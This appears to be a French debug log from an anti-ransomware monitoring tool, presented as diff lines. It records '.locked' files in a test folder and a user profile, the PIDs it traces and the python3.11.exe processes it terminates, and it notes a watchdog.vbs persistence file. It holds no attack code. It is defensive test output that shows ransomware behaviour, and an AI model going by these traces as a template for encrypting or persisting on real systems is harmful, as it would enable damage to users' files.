+2025-07-24 22:44:42.486Z [DEBUG] ProcessId détecté : 5932
+2025-07-24 22:44:42.497Z [WARN] Processus PID 5932 non trouvé
+2025-07-24 22:44:42.498Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (40).bmp.locked'
+2025-07-24 22:44:42.498Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (40).bmp.locked
+2025-07-24 22:44:42.498Z [DEBUG] ProcessId détecté : 6224
+2025-07-24 22:44:42.498Z [WARN] Processus PID 6224 non trouvé
+2025-07-24 22:44:42.498Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (41).bmp.locked'
+2025-07-24 22:44:42.498Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (41).bmp.locked
+2025-07-24 22:44:42.498Z [DEBUG] ProcessId détecté : 1776
+2025-07-24 22:44:42.498Z [WARN] Processus PID 1776 non trouvé
+2025-07-24 22:44:42.498Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (42).bmp.locked'
+2025-07-24 22:44:42.498Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (42).bmp.locked
+2025-07-24 22:44:42.498Z [DEBUG] ProcessId détecté : 9824
+2025-07-24 22:44:42.498Z [WARN] Processus PID 9824 non trouvé
+2025-07-24 22:44:42.517Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (43).bmp.locked'
+2025-07-24 22:44:42.517Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (43).bmp.locked
+2025-07-24 22:44:42.517Z [DEBUG] ProcessId détecté : 9888
+2025-07-24 22:44:42.517Z [WARN] Processus PID 9888 non trouvé
+2025-07-24 22:44:42.529Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (44).bmp.locked'
+2025-07-24 22:44:42.529Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (44).bmp.locked
+2025-07-24 22:44:42.529Z [DEBUG] ProcessId détecté : 8248
+2025-07-24 22:44:42.529Z [WARN] Processus PID 8248 non trouvé
+2025-07-24 22:44:42.529Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (45).bmp.locked'
+2025-07-24 22:44:42.529Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (45).bmp.locked
+2025-07-24 22:44:42.529Z [DEBUG] ProcessId détecté : 10368
+2025-07-24 22:44:42.545Z [WARN] Processus PID 10368 non trouvé
+2025-07-24 22:44:42.545Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (5).bmp.locked'
+2025-07-24 22:44:42.545Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (5).bmp.locked
+2025-07-24 22:44:42.545Z [DEBUG] ProcessId détecté : 9812
+2025-07-24 22:44:42.561Z [WARN] Processus PID 9812 non trouvé
+2025-07-24 22:44:42.561Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (6).bmp.locked'
+2025-07-24 22:44:42.561Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (6).bmp.locked
+2025-07-24 22:44:42.561Z [DEBUG] ProcessId détecté : 9784
+2025-07-24 22:44:42.561Z [WARN] Processus PID 9784 non trouvé
+2025-07-24 22:44:42.561Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (7).bmp.locked'
+2025-07-24 22:44:42.561Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (7).bmp.locked
+2025-07-24 22:44:42.561Z [DEBUG] ProcessId détecté : 10152
+2025-07-24 22:44:42.577Z [WARN] Processus PID 10152 non trouvé
+2025-07-24 22:44:42.577Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (8).bmp.locked'
+2025-07-24 22:44:42.577Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (8).bmp.locked
+2025-07-24 22:44:42.577Z [DEBUG] ProcessId détecté : 10808
+2025-07-24 22:44:42.577Z [WARN] Processus PID 10808 non trouvé
+2025-07-24 22:44:42.577Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (9).bmp.locked'
+2025-07-24 22:44:42.592Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (9).bmp.locked
+2025-07-24 22:44:42.592Z [DEBUG] ProcessId détecté : 8248
+2025-07-24 22:44:42.592Z [WARN] Processus PID 8248 non trouvé
+2025-07-24 22:44:42.592Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie.bmp.locked'
+2025-07-24 22:44:42.592Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie.bmp.locked
+2025-07-24 22:44:42.592Z [DEBUG] ProcessId détecté : 11076
+2025-07-24 22:44:42.592Z [WARN] Processus PID 11076 non trouvé
+2025-07-24 22:44:42.592Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap.bmp.locked'
+2025-07-24 22:44:42.608Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap.bmp.locked
+2025-07-24 22:44:42.608Z [DEBUG] ProcessId détecté : 4040
+2025-07-24 22:44:42.608Z [WARN] Processus PID 4040 non trouvé
+2025-07-24 22:44:42.623Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked'
+2025-07-24 22:44:42.623Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
+2025-07-24 22:44:42.623Z [DEBUG] ProcessId détecté : 10872
+2025-07-24 22:44:42.639Z [WARN] Processus PID 10872 non trouvé
+2025-07-24 22:44:42.639Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked'
+2025-07-24 22:44:42.639Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
+2025-07-24 22:44:42.639Z [DEBUG] ProcessId détecté : 10152
+2025-07-24 22:44:42.639Z [WARN] Processus PID 10152 non trouvé
+2025-07-24 22:44:42.655Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked'
+2025-07-24 22:44:42.655Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
+2025-07-24 22:44:42.655Z [DEBUG] ProcessId détecté : 10368
+2025-07-24 22:44:42.655Z [WARN] Processus PID 10368 non trouvé
+2025-07-24 22:44:42.655Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked'
+2025-07-24 22:44:42.655Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
+2025-07-24 22:44:42.655Z [DEBUG] ProcessId détecté : 9888
+2025-07-24 22:44:42.655Z [WARN] Processus PID 9888 non trouvé
+2025-07-24 22:44:42.655Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked'
+2025-07-24 22:44:42.655Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
+2025-07-24 22:44:42.655Z [DEBUG] ProcessId détecté : 6224
+2025-07-24 22:44:42.671Z [WARN] Processus PID 6224 non trouvé
+2025-07-24 22:44:42.671Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked'
+2025-07-24 22:44:42.671Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
+2025-07-24 22:44:42.671Z [DEBUG] ProcessId détecté : 11076
+2025-07-24 22:44:42.671Z [WARN] Processus PID 11076 non trouvé
+2025-07-24 22:44:42.705Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked'
+2025-07-24 22:44:42.705Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
+2025-07-24 22:44:42.705Z [DEBUG] ProcessId détecté : 9824
+2025-07-24 22:44:42.721Z [WARN] Processus PID 9824 non trouvé
+2025-07-24 22:44:42.737Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\searches\indexed locations.search-ms.locked'
+2025-07-24 22:44:42.737Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\indexed locations.search-ms.locked
+2025-07-24 22:44:42.737Z [DEBUG] ProcessId détecté : 6880
+2025-07-24 22:44:42.737Z [WARN] Processus PID 6880 non trouvé
+2025-07-24 22:44:42.752Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\searches\everywhere.search-ms.locked'
+2025-07-24 22:44:42.752Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\everywhere.search-ms.locked
+2025-07-24 22:44:42.752Z [DEBUG] ProcessId détecté : 4040
+2025-07-24 22:44:42.752Z [WARN] Processus PID 4040 non trouvé
+2025-07-24 22:44:42.768Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked'
+2025-07-24 22:44:42.768Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
+2025-07-24 22:44:42.768Z [DEBUG] ProcessId détecté : 8484
+2025-07-24 22:44:42.768Z [WARN] Processus PID 8484 non trouvé
+2025-07-24 22:44:42.768Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked'
+2025-07-24 22:44:42.768Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
+2025-07-24 22:44:42.768Z [DEBUG] ProcessId détecté : 3884
+2025-07-24 22:44:42.784Z [WARN] Processus PID 3884 non trouvé
+2025-07-24 22:44:42.784Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked'
+2025-07-24 22:44:42.784Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
+2025-07-24 22:44:42.784Z [DEBUG] ProcessId détecté : 4388
+2025-07-24 22:44:42.784Z [WARN] Processus PID 4388 non trouvé
+2025-07-24 22:44:42.799Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked'
+2025-07-24 22:44:42.799Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
+2025-07-24 22:44:42.799Z [DEBUG] ProcessId détecté : 8144
+2025-07-24 22:44:42.799Z [WARN] Processus PID 8144 non trouvé
+2025-07-24 22:44:42.799Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked'
+2025-07-24 22:44:42.799Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
+2025-07-24 22:44:42.815Z [DEBUG] ProcessId détecté : 3108
+2025-07-24 22:44:42.815Z [WARN] Processus PID 3108 non trouvé
+2025-07-24 22:44:42.815Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked'
+2025-07-24 22:44:42.815Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
+2025-07-24 22:44:42.815Z [DEBUG] ProcessId détecté : 10388
+2025-07-24 22:44:42.815Z [WARN] Processus PID 10388 non trouvé
+2025-07-24 22:44:42.815Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked'
+2025-07-24 22:44:42.815Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
+2025-07-24 22:44:42.830Z [DEBUG] ProcessId détecté : 5424
+2025-07-24 22:44:42.830Z [WARN] Processus PID 5424 non trouvé
+2025-07-24 22:44:42.847Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\searches\indexed locations.search-ms.locked'
+2025-07-24 22:44:42.847Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\indexed locations.search-ms.locked
+2025-07-24 22:44:42.847Z [DEBUG] ProcessId détecté : 10388
+2025-07-24 22:44:42.847Z [WARN] Processus PID 10388 non trouvé
+2025-07-24 22:44:42.861Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\searches\everywhere.search-ms.locked'
+2025-07-24 22:44:42.861Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\everywhere.search-ms.locked
+2025-07-24 22:44:42.861Z [DEBUG] ProcessId détecté : 8144
+2025-07-24 22:44:42.861Z [WARN] Processus PID 8144 non trouvé
+2025-07-24 22:44:44.954Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\appdata\roaming\microsoft\windows\themes\watchdog.vbs'
+2025-07-24 22:45:11.686Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\appdata\roaming\microsoft\windows\themes\watchdog.vbs'
+2025-07-24 22:45:39.154Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked'
+2025-07-24 22:45:39.545Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
+2025-07-24 22:45:39.545Z [DEBUG] ProcessId détecté : 8980
+2025-07-24 22:45:39.592Z [INFO] kill_process_tree appelé pour PID 8980 (python3.11.exe)
+2025-07-24 22:45:43.652Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked'
+2025-07-24 22:45:44.170Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
+2025-07-24 22:45:44.740Z [DEBUG] ProcessId détecté : 10916
+2025-07-24 22:45:44.833Z [INFO] kill_process_tree appelé pour PID 10916 (python3.11.exe)
+2025-07-24 22:45:45.280Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked'
+2025-07-24 22:45:46.217Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
+2025-07-24 22:45:46.467Z [DEBUG] ProcessId détecté : 6296
+2025-07-24 22:45:46.854Z [INFO] kill_process_tree appelé pour PID 6296 (python3.11.exe)
+2025-07-24 22:45:48.468Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked'
+2025-07-24 22:45:49.342Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
+2025-07-24 22:45:49.920Z [DEBUG] ProcessId détecté : 1976
+2025-07-24 22:45:49.983Z [INFO] kill_process_tree appelé pour PID 1976 (python3.11.exe)
+2025-07-24 22:45:55.150Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked'
+2025-07-24 22:45:57.125Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
+2025-07-24 22:45:58.417Z [DEBUG] ProcessId détecté : 5468
+2025-07-24 22:45:59.229Z [INFO] kill_process_tree appelé pour PID 5468 (python3.11.exe)
+2025-07-24 22:46:00.592Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked'
+2025-07-24 22:46:00.851Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
+2025-07-24 22:46:01.288Z [DEBUG] ProcessId détecté : 9692
+2025-07-24 22:46:01.581Z [INFO] kill_process_tree appelé pour PID 9692 (python3.11.exe)
+2025-07-24 22:46:02.537Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked'
+2025-07-24 22:46:03.293Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
+2025-07-24 22:46:03.836Z [DEBUG] ProcessId détecté : 10400
+2025-07-24 22:46:04.208Z [INFO] kill_process_tree appelé pour PID 10400 (python3.11.exe)
+2025-07-24 22:46:59.311Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\appdata\roaming\microsoft\windows\themes\watchdog.vbs'
+2025-07-24 22:46:59.420Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\appdata\roaming\microsoft\windows\themes\watchdog.vbs'
+2025-07-24 22:46:59.462Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (3).bmp.locked'
+2025-07-24 22:46:59.464Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (3).bmp.locked
+2025-07-24 22:46:59.466Z [DEBUG] ProcessId détecté : 10152
+2025-07-24 22:46:59.475Z [WARN] Processus PID 10152 non trouvé
+2025-07-24 22:46:59.478Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (25).bmp.locked'
+2025-07-24 22:46:59.480Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (25).bmp.locked
+2025-07-24 22:46:59.483Z [DEBUG] ProcessId détecté : 6224
+2025-07-24 22:46:59.484Z [WARN] Processus PID 6224 non trouvé
+2025-07-24 22:46:59.492Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (24).bmp.locked'
+2025-07-24 22:46:59.494Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (24).bmp.locked
+2025-07-24 22:46:59.497Z [DEBUG] ProcessId détecté : 9812
+2025-07-24 22:46:59.502Z [WARN] Processus PID 9812 non trouvé
+2025-07-24 22:46:59.505Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (28).bmp.locked'
+2025-07-24 22:46:59.505Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (28).bmp.locked
+2025-07-24 22:46:59.506Z [DEBUG] ProcessId détecté : 9784
+2025-07-24 22:46:59.510Z [WARN] Processus PID 9784 non trouvé
+2025-07-24 22:46:59.512Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (27).bmp.locked'
+2025-07-24 22:46:59.520Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (27).bmp.locked
+2025-07-24 22:46:59.522Z [DEBUG] ProcessId détecté : 5932
+2025-07-24 22:46:59.524Z [WARN] Processus PID 5932 non trouvé
+2025-07-24 22:46:59.527Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (29).bmp.locked'
+2025-07-24 22:46:59.528Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (29).bmp.locked
+2025-07-24 22:46:59.537Z [DEBUG] ProcessId détecté : 11076
+2025-07-24 22:46:59.539Z [WARN] Processus PID 11076 non trouvé
+2025-07-24 22:46:59.542Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (30).bmp.locked'
+2025-07-24 22:46:59.543Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (30).bmp.locked
+2025-07-24 22:46:59.545Z [DEBUG] ProcessId détecté : 10368
+2025-07-24 22:46:59.555Z [WARN] Processus PID 10368 non trouvé
+2025-07-24 22:46:59.558Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (32).bmp.locked'
+2025-07-24 22:46:59.559Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (32).bmp.locked
+2025-07-24 22:46:59.562Z [DEBUG] ProcessId détecté : 10872
+2025-07-24 22:46:59.567Z [WARN] Processus PID 10872 non trouvé
+2025-07-24 22:46:59.572Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (33).bmp.locked'
+2025-07-24 22:46:59.573Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (33).bmp.locked
+2025-07-24 22:46:59.574Z [DEBUG] ProcessId détecté : 9888
+2025-07-24 22:46:59.579Z [WARN] Processus PID 9888 non trouvé
+2025-07-24 22:46:59.583Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (34).bmp.locked'
+2025-07-24 22:46:59.583Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (34).bmp.locked
+2025-07-24 22:46:59.585Z [DEBUG] ProcessId détecté : 6880
+2025-07-24 22:46:59.586Z [WARN] Processus PID 6880 non trouvé
+2025-07-24 22:46:59.588Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (35).bmp.locked'
+2025-07-24 22:46:59.589Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (35).bmp.locked
+2025-07-24 22:46:59.593Z [DEBUG] ProcessId détecté : 9824
+2025-07-24 22:46:59.599Z [WARN] Processus PID 9824 non trouvé
+2025-07-24 22:46:59.602Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (36).bmp.locked'
+2025-07-24 22:46:59.603Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (36).bmp.locked
+2025-07-24 22:46:59.605Z [DEBUG] ProcessId détecté : 10808
+2025-07-24 22:46:59.607Z [WARN] Processus PID 10808 non trouvé
+2025-07-24 22:46:59.614Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (31).bmp.locked'
+2025-07-24 22:46:59.614Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (31).bmp.locked
+2025-07-24 22:46:59.616Z [DEBUG] ProcessId détecté : 1776
+2025-07-24 22:46:59.617Z [WARN] Processus PID 1776 non trouvé
+2025-07-24 22:46:59.620Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (37).bmp.locked'
+2025-07-24 22:46:59.621Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (37).bmp.locked
+2025-07-24 22:46:59.622Z [DEBUG] ProcessId détecté : 8248
+2025-07-24 22:46:59.624Z [WARN] Processus PID 8248 non trouvé
+2025-07-24 22:46:59.634Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (26).bmp.locked'
+2025-07-24 22:46:59.635Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (26).bmp.locked
+2025-07-24 22:46:59.637Z [DEBUG] ProcessId détecté : 4040
+2025-07-24 22:46:59.638Z [WARN] Processus PID 4040 non trouvé
+2025-07-24 22:46:59.645Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (38).bmp.locked'
+2025-07-24 22:46:59.646Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (38).bmp.locked
+2025-07-24 22:46:59.648Z [DEBUG] ProcessId détecté : 10152
+2025-07-24 22:46:59.649Z [WARN] Processus PID 10152 non trouvé
+2025-07-24 22:46:59.651Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (39).bmp.locked'
+2025-07-24 22:46:59.653Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (39).bmp.locked
+2025-07-24 22:46:59.653Z [DEBUG] ProcessId détecté : 10872
+2025-07-24 22:46:59.654Z [WARN] Processus PID 10872 non trouvé
+2025-07-24 22:46:59.654Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (4).bmp.locked'
+2025-07-24 22:46:59.654Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (4).bmp.locked
+2025-07-24 22:46:59.654Z [DEBUG] ProcessId détecté : 5932
+2025-07-24 22:46:59.654Z [WARN] Processus PID 5932 non trouvé
+2025-07-24 22:46:59.654Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (40).bmp.locked'
+2025-07-24 22:46:59.654Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (40).bmp.locked
+2025-07-24 22:46:59.654Z [DEBUG] ProcessId détecté : 6224
+2025-07-24 22:46:59.654Z [WARN] Processus PID 6224 non trouvé
+2025-07-24 22:46:59.670Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (41).bmp.locked'
+2025-07-24 22:46:59.670Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (41).bmp.locked
+2025-07-24 22:46:59.670Z [DEBUG] ProcessId détecté : 1776
+2025-07-24 22:46:59.670Z [WARN] Processus PID 1776 non trouvé
+2025-07-24 22:46:59.670Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (42).bmp.locked'
+2025-07-24 22:46:59.670Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (42).bmp.locked
+2025-07-24 22:46:59.670Z [DEBUG] ProcessId détecté : 9824
+2025-07-24 22:46:59.670Z [WARN] Processus PID 9824 non trouvé
+2025-07-24 22:46:59.686Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (43).bmp.locked'
+2025-07-24 22:46:59.686Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (43).bmp.locked
+2025-07-24 22:46:59.686Z [DEBUG] ProcessId détecté : 9888
+2025-07-24 22:46:59.686Z [WARN] Processus PID 9888 non trouvé
+2025-07-24 22:46:59.686Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (44).bmp.locked'
+2025-07-24 22:46:59.686Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (44).bmp.locked
+2025-07-24 22:46:59.686Z [DEBUG] ProcessId détecté : 8248
+2025-07-24 22:46:59.686Z [WARN] Processus PID 8248 non trouvé
+2025-07-24 22:46:59.702Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (45).bmp.locked'
+2025-07-24 22:46:59.702Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (45).bmp.locked
+2025-07-24 22:46:59.702Z [DEBUG] ProcessId détecté : 10368
+2025-07-24 22:46:59.702Z [WARN] Processus PID 10368 non trouvé
+2025-07-24 22:46:59.718Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (5).bmp.locked'
+2025-07-24 22:46:59.718Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (5).bmp.locked
+2025-07-24 22:46:59.718Z [DEBUG] ProcessId détecté : 9812
+2025-07-24 22:46:59.718Z [WARN] Processus PID 9812 non trouvé
+2025-07-24 22:46:59.733Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (6).bmp.locked'
+2025-07-24 22:46:59.733Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (6).bmp.locked
+2025-07-24 22:46:59.733Z [DEBUG] ProcessId détecté : 9784
+2025-07-24 22:46:59.733Z [WARN] Processus PID 9784 non trouvé
+2025-07-24 22:46:59.733Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (7).bmp.locked'
+2025-07-24 22:46:59.733Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (7).bmp.locked
+2025-07-24 22:46:59.733Z [DEBUG] ProcessId détecté : 10152
+2025-07-24 22:46:59.733Z [WARN] Processus PID 10152 non trouvé
+2025-07-24 22:46:59.733Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (8).bmp.locked'
